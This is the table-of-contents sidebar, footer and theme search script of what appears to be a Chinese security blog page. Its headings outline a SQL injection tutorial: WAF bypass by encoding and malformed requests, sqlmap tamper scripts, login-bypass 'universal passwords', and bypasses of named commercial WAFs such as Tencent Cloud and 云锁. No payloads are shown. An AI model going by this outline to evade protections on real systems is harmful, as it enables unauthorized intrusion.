class="nav-text">DBMS_EXPORT_EXTENSION()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dbms-xmlquery-newcontext"><span class="nav-number">4.6.2.</span> <span class="nav-text">dbms_xmlquery.newcontext()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DBMS-JAVA-TEST-FUNCALL"><span class="nav-number">4.6.3.</span> <span class="nav-text">DBMS_JAVA_TEST.FUNCALL()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.6.4.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%80%83%E9%80%B8waf%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="nav-number">5.</span> <span class="nav-text">逃逸waf注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95WAF%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-number">5.0.1.</span> <span class="nav-text">简单WAF绕过技术</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF"><span class="nav-number">5.0.1.1.</span> <span class="nav-text">常见绕过技术</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%AC%A6%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="nav-number">5.0.1.2.</span> <span class="nav-text">常见符号绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-%E7%AD%89%E9%80%BB%E8%BE%91%E5%A4%84%E7%90%86%E5%AD%97%E7%AC%A6"><span class="nav-number">5.0.1.3.</span> <span class="nav-text">过滤&amp;,|,*,&#x2F;,&#x3D;等逻辑处理字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-number">5.0.1.4.</span> <span class="nav-text">过滤&lt;,&gt;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="nav-number">5.0.1.5.</span> <span class="nav-text">关键字过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A8%E5%90%8D%E7%AD%89%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-number">5.0.1.6.</span> <span class="nav-text">表名等被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E7%9F%A5%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">5.0.1.7.</span> <span class="nav-text">未知字段名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="nav-number">5.0.1.8.</span> <span class="nav-text">空格过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E5%85%B6%E4%BB%96%E8%BF%87%E6%BB%A4"><span class="nav-number">5.0.1.9.</span> <span class="nav-text">判断其他过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">5.0.1.10.</span> <span class="nav-text">不安全函数绕过：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E7%94%A8WAF%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">5.0.1.11.</span> <span class="nav-text">通用WAF绕过：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-number">5.0.2.</span> <span class="nav-text">关键字过滤绕过：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7WAF%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%EF%BC%9A"><span class="nav-number">5.0.3.</span> <span class="nav-text">高级WAF绕过技术：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E5%9C%A8%E5%93%AA%E9%87%8C"><span class="nav-number">5.0.4.</span> <span class="nav-text">WAF在哪里:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86"><span class="nav-number">5.0.5.</span> <span class="nav-text">WAF数据处理:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF-BYPASS%E7%9A%84%E7%90%86%E8%A7%A3"><span class="nav-number">5.0.6.</span> <span class="nav-text">WAF BYPASS的理解:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypass-WAF-%E5%A7%BF%E5%8A%BF"><span class="nav-number">5.0.7.</span> <span class="nav-text">Bypass WAF 姿势:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E7%9C%9F%E5%AE%9Eip-bypass"><span class="nav-number">5.0.7.1.</span> <span class="nav-text">通过真实ip bypass:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web-Server%E5%B1%82-bypass"><span class="nav-number">5.0.7.2.</span> <span class="nav-text">Web Server层 bypass:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#IIS%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">5.0.7.2.1.</span> <span class="nav-text">IIS服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%89%B9%E6%80%A7"><span class="nav-number">5.0.7.2.1.1.</span> <span class="nav-text">%特性</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#u%E7%89%B9%E6%80%A7"><span class="nav-number">5.0.7.2.1.2.</span> <span class="nav-text">%u特性</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%8F%A6%E7%B1%BB-u%E7%89%B9%E6%80%A7"><span class="nav-number">5.0.7.2.1.3.</span> <span class="nav-text">另类%u特性</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#apache%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">5.0.7.2.2.</span> <span class="nav-text">apache服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%95%B8%E5%BD%A2method"><span class="nav-number">5.0.7.2.2.1.</span> <span class="nav-text">畸形method</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#php-apache%E7%95%B8%E5%BD%A2%E7%9A%84boundary"><span class="nav-number">5.0.7.2.2.2.</span> <span class="nav-text">php+apache畸形的boundary</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">5.0.7.2.3.</span> <span class="nav-text">nginx服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E7%95%B8%E5%BD%A2method-1"><span class="nav-number">5.0.7.2.3.1.</span> <span class="nav-text">畸形method</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#post%E9%95%BF%E6%95%B0%E6%8D%AE%EF%BC%8C%E7%BB%95%E8%BF%87ngx-lua-waf"><span class="nav-number">5.0.7.2.3.2.</span> <span class="nav-text">post长数据，绕过ngx_lua_waf</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E5%B1%82bypass"><span class="nav-number">5.0.7.3.</span> <span class="nav-text">Web应用程序层bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8C%E9%87%8Durl%E7%BC%96%E7%A0%81"><span class="nav-number">5.0.7.3.1.</span> <span class="nav-text">双重url编码</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E8%8E%B7%E5%8F%96%E6%96%B9%E5%BC%8F"><span class="nav-number">5.0.7.3.2.</span> <span class="nav-text">请求获取方式</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#GET-POST-COOKIE"><span class="nav-number">5.0.7.3.2.1.</span> <span class="nav-text">GET,POST,COOKIE</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#urlencode%E5%92%8Cform-data"><span class="nav-number">5.0.7.3.2.2.</span> <span class="nav-text">urlencode和form-data</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#asp-asp-net-request%E8%A7%A3%E6%9E%90"><span class="nav-number">5.0.7.3.2.3.</span> <span class="nav-text">asp&#x2F;asp.net request解析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#hpp%E6%96%B9%E5%BC%8F"><span class="nav-number">5.0.7.3.3.</span> <span class="nav-text">hpp方式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82bypass"><span class="nav-number">5.0.7.4.</span> <span class="nav-text">数据库层bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">5.0.7.4.1.</span> <span class="nav-text">mysql数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="nav-number">5.0.7.4.1.1.</span> <span class="nav-text">常见过滤的位置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mysql%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0"><span class="nav-number">5.0.7.4.1.2.</span> <span class="nav-text">mysql常见过滤函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E9%80%97%E5%8F%B7"><span class="nav-number">5.0.7.4.1.3.</span> <span class="nav-text">过滤了逗号</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%B5%AE%E7%82%B9%E7%B2%BE%E5%BA%A6%E7%89%B9%E6%80%A7"><span class="nav-number">5.0.7.4.1.4.</span> <span class="nav-text">浮点精度特性</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sqlserver%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-number">5.0.7.4.2.</span> <span class="nav-text">sqlserver数据库</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E4%BD%8D%E7%BD%AE"><span class="nav-number">5.0.7.4.2.1.</span> <span class="nav-text">常见过滤位置</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mssql%E5%B8%B8%E8%A7%81%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0"><span class="nav-number">5.0.7.4.2.2.</span> <span class="nav-text">mssql常见过滤函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WAF%E5%B1%82bypass"><span class="nav-number">5.0.7.5.</span> <span class="nav-text">WAF层bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%80%A7%E8%83%BDbypass"><span class="nav-number">5.0.7.5.1.</span> <span class="nav-text">性能bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%A7%E8%83%BD%E6%A3%80%E6%B5%8Bbypass"><span class="nav-number">5.0.7.5.1.1.</span> <span class="nav-text">性能检测bypass</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%80%A7%E8%83%BD%E8%B4%9F%E8%BD%BDbypass"><span class="nav-number">5.0.7.5.1.2.</span> <span class="nav-text">性能负载bypass</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fuzz-bypass"><span class="nav-number">5.0.7.6.</span> <span class="nav-text">fuzz bypass</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95bypass"><span class="nav-number">5.0.7.7.</span> <span class="nav-text">白名单bypass</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="nav-number">5.0.8.</span> <span class="nav-text">结束语</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="nav-number">6.</span> <span class="nav-text">自动化注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E4%BD%BF%E7%94%A8"><span class="nav-number">6.1.</span> <span class="nav-text">sqlmap使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8tamper%E7%BB%95%E8%BF%87waf"><span class="nav-number">6.2.</span> <span class="nav-text">使用tamper绕过waf</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF"><span class="nav-number">7.</span> <span class="nav-text">其他注入技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84SQL%E6%94%BB%E5%87%BB"><span class="nav-number">7.1.</span> <span class="nav-text">基于约束的SQL攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%EF%BC%88%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number">7.2.</span> <span class="nav-text">万能密码（内联注入）</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E6%89%A9%E5%B1%95"><span class="nav-number">8.</span> <span class="nav-text">后续扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ctf%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3wp"><span class="nav-number">8.1.</span> <span class="nav-text">ctf注入相关wp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B0%E5%87%BA%E7%8E%B0%E7%9A%84waf%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF%E6%B1%87%E6%80%BB"><span class="nav-number">8.2.</span> <span class="nav-text">新出现的waf绕过技术汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2017-10-19Bypass-D%E7%9B%BE-IIS%E9%98%B2%E7%81%AB%E5%A2%99SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="nav-number">8.2.1.</span> <span class="nav-text">2017-10-19Bypass D盾_IIS防火墙SQL注入防御</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS-PHP-MYSQL"><span class="nav-number">8.2.1.1.</span> <span class="nav-text">IIS+PHP+MYSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="nav-number">8.2.1.1.1.</span> <span class="nav-text">白名单绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6"><span class="nav-number">8.2.1.1.2.</span> <span class="nav-text">空白字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#N%E5%BD%A2%E5%BC%8F"><span class="nav-number">8.2.1.1.3.</span> <span class="nav-text">\N形式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IIS-ASP-ASPX-MSSQL"><span class="nav-number">8.2.1.2.</span> <span class="nav-text">IIS+ASP&#x2F;ASPX+MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">8.2.1.2.1.</span> <span class="nav-text">白名单</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6-1"><span class="nav-number">8.2.1.2.2.</span> <span class="nav-text">空白字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1E%E5%BD%A2%E5%BC%8F"><span class="nav-number">8.2.1.2.3.</span> <span class="nav-text">1E形式</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">8.2.1.3.</span> <span class="nav-text">参考文献</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2018-10-10%E7%BB%95%E8%BF%87%E8%85%BE%E8%AE%AF%E4%BA%91waf%E5%B9%B6%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">8.2.2.</span> <span class="nav-text">2018-10-10绕过腾讯云waf并延时注入</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%91%E9%94%81%E7%BB%95%E8%BF%87"><span class="nav-number">9.</span> <span class="nav-text">云锁绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#union-select%E6%B3%A8%E5%85%A5"><span class="nav-number">9.1.</span> <span class="nav-text">union select注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8%E5%85%A5"><span class="nav-number">9.2.</span> <span class="nav-text">盲注入</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2026</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">h4ckforjob</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




    <div class="powered-by">
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <i class="fa fa-user-md"></i>
    <span id="busuanzi_container_site_uv">
        本站访客数: <span id="busuanzi_value_site_uv"></span>
    </span>
    <span class="post-meta-divider">|</span>
    <span id="busuanzi_container_site_pv">
        本站访问量: <span id="busuanzi_value_site_pv"></span>
    </span>
</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  

  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
